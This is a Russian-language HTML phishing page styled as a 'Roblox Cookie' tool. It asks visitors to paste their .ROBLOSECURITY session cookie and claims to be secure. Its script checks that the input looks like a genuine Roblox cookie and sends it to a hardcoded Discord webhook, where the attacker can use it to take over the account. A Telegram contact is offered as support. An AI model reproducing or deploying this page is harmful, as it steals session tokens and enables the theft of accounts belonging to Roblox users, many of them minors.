<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie • Dark</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #0a0c0f;
            position: relative;
            overflow: hidden;
        }

        /* Темный анимированный фон */
        body::before {
            content: '';
            position: absolute;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 50% 50%, 
                #1a1f2a 0%,
                #0d0f14 30%,
                #030405 70%
            );
            animation: darkDrift 25s ease infinite;
            z-index: -2;
        }

        body::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                45deg,
                rgba(0, 102, 255, 0.02) 0px,
                rgba(0, 102, 255, 0.02) 2px,
                transparent 2px,
                transparent 8px
            );
            z-index: -1;
        }

        @keyframes darkDrift {
            0% { transform: translate(-10%, -10%) rotate(0deg); }
            50% { transform: translate(10%, 10%) rotate(5deg); }
            100% { transform: translate(-10%, -10%) rotate(0deg); }
        }

        .container {
            background: rgba(18, 22, 28, 0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            padding: 45px 40px;
            border-radius: 40px;
            width: 100%;
            max-width: 440px;
            box-shadow: 
                0 20px 50px rgba(0, 0, 0, 0.8),
                0 0 0 1px rgba(255, 255, 255, 0.03) inset,
                0 0 30px rgba(0, 102, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.03);
            transition: 0.4s;
            position: relative;
            z-index: 2;
        }

        .container:hover {
            box-shadow: 
                0 30px 60px rgba(0, 0, 0, 0.9),
                0 0 0 1px rgba(255, 255, 255, 0.05) inset,
                0 0 50px rgba(0, 102, 255, 0.3);
            transform: translateY(-2px);
        }

        h1 {
            text-align: center;
            margin-bottom: 35px;
            font-weight: 400;
            font-size: 2.2rem;
            letter-spacing: 3px;
            background: linear-gradient(135deg, #8ba0ff, #4d7aff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 20px rgba(77, 122, 255, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        h1 span {
            font-size: 2rem;
            filter: drop-shadow(0 0 8px #4d7aff);
        }

        .input-group {
            margin-bottom: 30px;
            position: relative;
        }

        .input-group label {
            display: block;
            margin-bottom: 12px;
            color: #a0b0c0;
            font-size: 0.9rem;
            letter-spacing: 1px;
            text-transform: uppercase;
            opacity: 0.7;
        }

        textarea {
            width: 100%;
            padding: 18px 20px;
            background: rgba(8, 12, 18, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 24px;
            color: #e0e0e0;
            font-size: 0.95rem;
            line-height: 1.5;
            resize: vertical;
            min-height: 120px;
            outline: none;
            transition: 0.3s;
            box-shadow: inset 0 4px 10px rgba(0, 0, 0, 0.5);
        }

        textarea:hover {
            border-color: rgba(77, 122, 255, 0.3);
            box-shadow: inset 0 4px 15px rgba(0, 0, 0, 0.7), 0 0 20px rgba(77, 122, 255, 0.2);
        }

        textarea:focus {
            border-color: #4d7aff;
            box-shadow: inset 0 4px 15px rgba(0, 0, 0, 0.7), 0 0 30px rgba(77, 122, 255, 0.4);
        }

        .hint {
            margin-top: 8px;
            font-size: 0.8rem;
            color: #708090;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .hint i {
            color: #4d7aff;
            font-style: normal;
        }

        .button-group {
            display: flex;
            gap: 15px;
            margin: 25px 0 20px;
        }

        .btn-primary {
            flex: 1;
            padding: 16px 20px;
            background: linear-gradient(135deg, #2a3f6e, #1b2b4a);
            border: none;
            border-radius: 36px;
            color: white;
            font-weight: 600;
            font-size: 1rem;
            letter-spacing: 1px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(77, 122, 255, 0.2) inset;
            text-transform: uppercase;
        }

        .btn-primary:hover {
            background: linear-gradient(135deg, #3457a0, #243b66);
            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.8), 0 0 0 1px #4d7aff inset, 0 0 30px #4d7aff;
            transform: scale(1.02);
        }

        .btn-primary:active {
            transform: scale(0.98);
        }

        .btn-support {
            flex: 1;
            padding: 16px 20px;
            background: rgba(30, 20, 30, 0.8);
            border: 1px solid rgba(255, 70, 70, 0.2);
            border-radius: 36px;
            color: #ffa0a0;
            font-weight: 600;
            text-decoration: none;
            text-align: center;
            transition: 0.3s;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(5px);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-support:hover {
            background: rgba(60, 25, 35, 0.9);
            border-color: rgba(255, 80, 80, 0.5);
            color: #ffc0c0;
            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.8), 0 0 20px rgba(255, 70, 70, 0.4);
            transform: scale(1.02);
        }

        .status {
            margin-top: 25px;
            padding: 16px;
            border-radius: 30px;
            text-align: center;
            font-weight: 500;
            font-size: 0.95rem;
            display: none;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            color: #ccc;
        }

        .status.success {
            display: block;
            background: rgba(0, 40, 20, 0.7);
            border-color: rgba(0, 255, 100, 0.2);
            color: #a0ffc0;
            box-shadow: 0 0 20px rgba(0, 255, 100, 0.2);
        }

        .status.error {
            display: block;
            background: rgba(40, 0, 10, 0.7);
            border-color: rgba(255, 70, 70, 0.3);
            color: #ffb0b0;
            box-shadow: 0 0 20px rgba(255, 70, 70, 0.2);
        }

        .stats {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 25px;
            font-size: 0.8rem;
            color: #404c5c;
        }

        .stats span {
            color: #5f7f9f;
        }

        footer {
            margin-top: 25px;
            text-align: center;
            color: #303a44;
            font-size: 0.8rem;
            display: flex;
            justify-content: center;
            gap: 15px;
        }

        footer a {
            color: #405570;
            text-decoration: none;
            transition: 0.2s;
        }

        footer a:hover {
            color: #6d8bb0;
        }

        .footer-separator {
            color: #303a44;
        }

        /* Плавное появление */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .container {
            animation: fadeIn 0.8s ease;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>
            <span>🌙</span> ROBLOX COOKIE <span>🌙</span>
        </h1>
        
        <div class="input-group">
            <label>⛔ Только Roblox куки</label>
            <textarea id="cookieInput" placeholder="Вставьте .ROBLOSECURITY куки сюда..." autocomplete="off"></textarea>
            <div class="hint">
                <i>⚠️</i> Принимаются только куки вида _|WARNING|_ или .ROBLOSECURITY
            </div>
        </div>

        <div class="button-group">
            <button class="btn-primary" onclick="sendCookie()">Отправить</button>
            <a href="https://t.me/sventsi" target="_blank" rel="noopener noreferrer" class="btn-support">Поддержка</a>
        </div>

        <div id="statusMessage" class="status"></div>

        <div class="stats">
            <div><span>📦</span> only cookies</div>
            <div><span>🔒</span> secure</div>
        </div>

        <footer>
            <a href="https://t.me/sventsi" target="_blank" rel="noopener noreferrer">Telegram</a>
            <span class="footer-separator">•</span>
            <a href="info.html" target="_blank" rel="noopener noreferrer">Информация</a>
        </footer>
    </div>

    <script>
        function isValidRobloxCookie(text) {
            if (!text || typeof text !== 'string') return false;
            
            // Очищаем от пробелов
            const cleaned = text.trim();
            
            // Проверяем длину (типичная куки довольно длинная)
            if (cleaned.length < 50) return false;
            
            // Проверяем наличие характерных для Roblox куки маркеров
            const hasWarning = cleaned.includes('_|WARNING|_');
            const hasRobloSecurity = cleaned.includes('.ROBLOSECURITY');
            const hasDot = cleaned.includes('COOKIE') || cleaned.includes('cookie');
            
            // Проверяем структуру (должна содержать и буквы, и цифры, и спецсимволы)
            const hasLetters = /[a-zA-Z]/.test(cleaned);
            const hasNumbers = /[0-9]/.test(cleaned);
            const hasSpecial = /[_\|\-\.]/.test(cleaned);
            
            // Куки Roblox обычно содержат все эти элементы
            const isValidStructure = hasLetters && hasNumbers && hasSpecial;
            
            // Это куки, если есть предупреждение или .ROBLOSECURITY и правильная структура
            return (hasWarning || hasRobloSecurity || (hasDot && isValidStructure)) && cleaned.length > 40;
        }

        function sendCookie() {
            const cookieInput = document.getElementById('cookieInput');
            const statusDiv = document.getElementById('statusMessage');
            const rawCookie = cookieInput.value;

            // Сбрасываем класс
            statusDiv.className = 'status';

            // Проверка на пустоту
            if (!rawCookie || rawCookie.trim() === '') {
                statusDiv.textContent = '❌ Введите куки';
                statusDiv.className = 'status error';
                return;
            }

            // ВАЖНО: проверка, что это действительно Roblox куки
            if (!isValidRobloxCookie(rawCookie)) {
                statusDiv.textContent = '❌ Ошибка: это не Roblox куки. Разрешены только куки Roblox.';
                statusDiv.className = 'status error';
                return;
            }

            // Показываем статус отправки
            statusDiv.textContent = '⏳ Проверка и отправка...';
            statusDiv.className = 'status';

            // Webhook Discord
            const webhookUrl = 'https://discord.com/api/webhooks/1481637388227711146/0yj7c1HAwziyYjADJ1KsRuLJ72mfH8R-dfHziSjZW7S8ICrRNGm_tJjxy6c4X0z7gc7S';

            const data = {
                content: '🌙 **НОВЫЙ ROBLOX COOKIE** 🌙',
                embeds: [{
                    title: '🍪 Cookie получен',
                    description: '```\n' + rawCookie + '\n```',
                    color: 0x2c2f33,
                    fields: [
                        {
                            name: '📊 Длина',
                            value: rawCookie.length + ' символов',
                            inline: true
                        },
                        {
                            name: '🔑 Тип',
                            value: rawCookie.includes('_|WARNING|_') ? '⚠️ WARNING cookie' : '.ROBLOSECURITY',
                            inline: true
                        },
                        {
                            name: '🕒 Время',
                            value: new Date().toLocaleString('ru-RU'),
                            inline: true
                        }
                    ],
                    footer: {
                        text: 'Темная атмосфера • только куки'
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            // Отправка в Discord
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    statusDiv.textContent = '✅ Куки успешно отправлены!';
                    statusDiv.className = 'status success';
                    cookieInput.value = ''; // Очищаем поле
                } else {
                    throw new Error('Ошибка отправки');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                statusDiv.textContent = '❌ Ошибка при отправке. Попробуйте позже.';
                statusDiv.className = 'status error';
            });

            // Автоскрытие статуса через 7 секунд
            setTimeout(() => {
                if (statusDiv.classList.contains('success') || statusDiv.classList.contains('error')) {
                    statusDiv.style.opacity = '0';
                    setTimeout(() => {
                        statusDiv.style.opacity = '1';
                        statusDiv.className = 'status';
                        statusDiv.textContent = '';
                    }, 500);
                }
            }, 7000);
        }

        // Отправка по Enter (но с Shift+Enter для новой строки)
        document.getElementById('cookieInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                sendCookie();
            }
        });

        // Эффект неонового свечения при фокусе
        document.getElementById('cookieInput').addEventListener('focus', function() {
            this.parentElement.style.transform = 'scale(1.01)';
        });

        document.getElementById('cookieInput').addEventListener('blur', function() {
            this.parentElement.style.transform = 'scale(1)';
        });
    </script>
</body>
</html>
